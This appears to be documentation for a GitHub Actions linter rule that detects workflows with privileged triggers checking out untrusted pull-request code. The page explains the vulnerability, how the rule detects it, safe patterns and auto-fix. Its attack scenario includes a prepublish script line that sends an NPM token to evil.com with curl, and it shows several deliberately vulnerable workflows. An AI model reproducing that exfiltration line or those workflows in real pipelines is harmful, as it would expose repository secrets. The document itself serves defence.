---
title: "Untrusted Checkout Rule"
weight: 1
---

### Untrusted Checkout Rule Overview

This rule detects when workflows with privileged triggers check out untrusted code from pull requests. This is a **critical security vulnerability** (CVSS 9.3) that allows attackers to exfiltrate secrets or compromise the repository.

**Vulnerable Example:**

```yaml
name: PR Build
on: pull_request_target  # Dangerous: Runs in base repo context with secrets access

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checking out untrusted PR code
      - run: npm install  # Malicious code can access ${{ secrets.NPM_TOKEN }}
```

**Detection Output:**

```bash
vulnerable.yaml:9:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 2). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://codeql.github.com/codeql-query-help/actions/actions-untrusted-checkout-critical/ for more details [untrusted-checkout]
      9 👈|          ref: ${{ github.event.pull_request.head.sha }}
```

### Security Background

#### Why is this dangerous?

GitHub Actions provides different trigger types that run with different permission levels:

| Trigger | Context | Secrets Access | Write Permissions |
|---------|---------|----------------|-------------------|
| `pull_request` | PR context (fork) | ❌ No | ❌ No (read-only) |
| `pull_request_target` | Base repo context | ✅ Yes | ✅ Yes |
| `issue_comment` | Base repo context | ✅ Yes | ✅ Yes |
| `workflow_run` | Base repo context | ✅ Yes | ✅ Yes |
| `workflow_call` | Inherits from caller | ✅ Yes (if caller has) | ✅ Yes (if caller has) |

**The Vulnerability:** When a workflow uses `pull_request_target`, `issue_comment`, `workflow_run`, or `workflow_call` triggers and explicitly checks out code from the pull request HEAD, it creates a **Poisoned Pipeline Execution** vulnerability. External attackers can:

1. **Exfiltrate Secrets:** Access `${{ secrets.* }}` values
2. **Modify Repository:** Push malicious commits or tags
3. **Compromise CI/CD:** Poison build artifacts or deployment pipelines
4. **Supply Chain Attack:** Inject malicious code into packages

#### Real-World Attack Scenario

```yaml
on: pull_request_target  # Attacker creates PR from fork
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
      - run: npm publish  # Attacker's package.json contains:
                          # "scripts": { "prepublish": "curl https://evil.com?token=$NPM_TOKEN" }
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}  # Secret is exposed!
```

#### OWASP and CWE Mapping

- **CWE-829:** Inclusion of Functionality from Untrusted Control Sphere
- **OWASP Top 10 CI/CD Security Risks:**
  - **CICD-SEC-4:** Poisoned Pipeline Execution (PPE)

### Technical Detection Mechanism

The rule performs three-step detection:

**Step 1: Identify Privileged Triggers**

```go
// In VisitWorkflowPre
for _, event := range workflow.On {
    if webhookEvent, ok := event.(*ast.WebhookEvent); ok {
        triggerName := webhookEvent.EventName()
        switch triggerName {
        case "pull_request_target", "issue_comment", "workflow_run":
            // Mark workflow as having dangerous trigger
            rule.hasDangerousTrigger = true
        }
    }
}
```

**Step 2: Find Checkout Actions**

```go
// In VisitStep
if action, ok := step.Exec.(*ast.ExecAction); ok {
    if strings.HasPrefix(action.Uses.Value, "actions/checkout@") {
        // Found checkout action - check ref parameter
    }
}
```

**Step 3: Analyze Ref Parameter**

```go
// Check if ref points to PR HEAD
refInput := action.Inputs["ref"]
if refInput != nil && refInput.Value.ContainsExpression() {
    // Parse expressions like ${{ github.event.pull_request.head.sha }}
    if isUntrustedPRExpression(refInput.Value) {
        // REPORT ERROR
    }
}
```

### Detection Logic Explanation

#### Dangerous Triggers Detected

1. **`pull_request_target`**
   - Runs in base repository context
   - Has access to all repository secrets
   - Can write to the base repository
   - Commonly misused for PR validation workflows

2. **`issue_comment`**
   - Triggered by comments on PRs from external contributors
   - Runs with write permissions
   - Can be abused if PR code is checked out

3. **`workflow_run`**
   - Triggered after another workflow completes
   - Runs in base repository context with secrets access
   - Used for trusted workflow separation, but dangerous if misused

4. **`workflow_call`**
   - Enables workflow reuse by allowing one workflow to call another
   - Inherits the security context of the calling workflow
   - Can be privileged if called from a privileged workflow (e.g., one triggered by `pull_request_target`)
   - Dangerous when it checks out untrusted PR code

#### Untrusted Ref Patterns

The rule detects these dangerous ref expressions:

- `${{ github.event.pull_request.head.sha }}` - PR HEAD commit SHA
- `${{ github.event.pull_request.head.ref }}` - PR HEAD branch reference
- Any expression containing `github.event.pull_request.head.*`

#### Safe Patterns

✅ **Safe Alternative 1: Use `pull_request` trigger**

```yaml
on: pull_request  # No secrets access, read-only permissions
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Safe: defaults to PR merge commit
      - run: npm test  # No access to secrets
```

✅ **Safe Alternative 2: Don't checkout PR code**

```yaml
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      # No checkout - only use GitHub API
      - uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.addLabels({
              owner: context.repo.owner,
              repo: context.repo.name,
              issue_number: context.issue.number,
              labels: ['reviewed']
            })
```

✅ **Safe Alternative 3: Two-workflow pattern**

```yaml
# Workflow 1: Untrusted (pull_request trigger)
name: Build PR
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
      - uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: results.json
```

```yaml
# Workflow 2: Trusted (workflow_run trigger)
name: Publish Results
on:
  workflow_run:
    workflows: ["Build PR"]
    types: [completed]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      # No checkout of PR code - only download artifacts
      - uses: actions/download-artifact@v4
      - run: publish-results  # Can safely use secrets here
        env:
          API_TOKEN: ${{ secrets.API_TOKEN }}
```

### False Positives

The rule has very few false positives because:

1. It only triggers when **both** conditions are met (privileged trigger + untrusted checkout)
2. Safe checkout patterns are explicitly allowed:
   - No `ref` parameter (defaults to trigger SHA - safe)
   - `ref: ${{ github.sha }}` (base branch - safe)
   - `ref: main` (literal branch names - safe)
   - `pull_request` trigger (no privileges - safe)

### References

#### GitHub Documentation
- {{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections" >}}
- {{< popup_link2 href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target" >}}

#### Security Research
- {{< popup_link2 href="https://codeql.github.com/codeql-query-help/actions/actions-untrusted-checkout-critical/" >}}
- {{< popup_link2 href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" >}}

#### OWASP Resources
- {{< popup_link2 href="https://owasp.org/www-project-top-10-ci-cd-security-risks/" >}}

### Auto-Fix

This rule supports automatic fixing. When you run sisakulint with the `-fix on` flag, it will automatically replace dangerous `ref` parameters with a safe default.

**Auto-fix behavior:**
- Replaces `ref: ${{ github.event.pull_request.head.sha }}` with `ref: ${{ github.sha }}`
- Replaces `ref: ${{ github.event.pull_request.head.ref }}` with `ref: ${{ github.sha }}`
- `github.sha` points to the base branch SHA, which is safe to checkout

**Example:**

Before auto-fix:
```yaml
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
```

After running `sisakulint -fix on`:
```yaml
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.sha }}
```

**Note:** Auto-fix provides a safe default, but you should review whether your workflow actually needs to checkout code at all when using privileged triggers. Consider using the two-workflow pattern or removing the checkout step entirely if appropriate.

### Remediation Steps

When this rule triggers:

1. **Use auto-fix for quick remediation**
   - Run `sisakulint -fix on` to automatically replace dangerous refs with safe defaults
   - Review the changes to ensure they meet your workflow requirements

2. **Assess if you need privileged access**
   - If you don't need secrets or write permissions, switch to `pull_request` trigger

3. **Use the two-workflow pattern**
   - Separate untrusted execution (PR code) from privileged operations (secrets access)

4. **Avoid checking out PR code**
   - If using `pull_request_target` for labeling or commenting, use GitHub API instead of checking out code

5. **Review existing workflows**
   - Audit all workflows using `pull_request_target`, `issue_comment`, `workflow_run`, or `workflow_call`
   - Ensure no PR code is executed in privileged contexts

### Detection of git/gh-based PR checkouts

In addition to `actions/checkout` with an unsafe `ref`, the rule detects untrusted
PR code being pulled into the workspace with git/gh commands in `run:` steps:

- `gh pr checkout <pr>` — always checks out the PR head.
- `git fetch origin pull/<n>/head` — fetches the PR head ref.
- `git checkout <ref> -- <paths>` / `git switch <ref>` / `git restore <ref>` where
  the ref resolves to a PR head SHA/ref, either inline
  (`${{ github.event.pull_request.head.sha }}`, `refs/pull/...`) or via a step
  env var whose value is tainted (`PR_SHA: ${{ needs.*.outputs.pr_sha }}`).
- `git reset --hard <ref>` where `<ref>` is a PR head SHA.

**Vulnerable Example:**

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          git fetch origin pull/${{ github.event.pull_request.number }}/head
          rm -rf tasks/
          git checkout "$PR_SHA" -- tasks/
      - run: harbor run -p tasks/...   # executes attacker-controlled task code
```

This is the same Poisoned Pipeline Execution pattern as `actions/checkout` with a
PR ref: the attacker's PR code is executed in a privileged context with access to
repository secrets. Prefer the same mitigations: use `pull_request`, avoid
checking out PR code entirely, or isolate untrusted execution in an unprivileged
job or openid-connect-token-free runner.

### Additional Resources

For more information on securing GitHub Actions workflows, see:
- [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [OWASP CI/CD Security Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
